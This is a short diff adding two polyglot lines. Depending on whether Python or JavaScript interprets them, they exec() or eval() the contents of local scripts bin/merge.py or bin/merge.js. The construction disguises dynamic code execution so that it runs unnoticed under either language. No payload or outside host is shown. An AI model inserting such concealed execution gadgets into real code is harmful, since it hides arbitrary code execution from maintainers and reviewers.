@@ -1,0 +1,2 @@
+1 // (lambda: exec(open("bin/merge.py").read(), globals()) or 1)()
+lambda: eval("(function(){const fs=require('node:fs');const data=fs.readFileSync('bin/merge.js','utf8');return eval(data)})();")
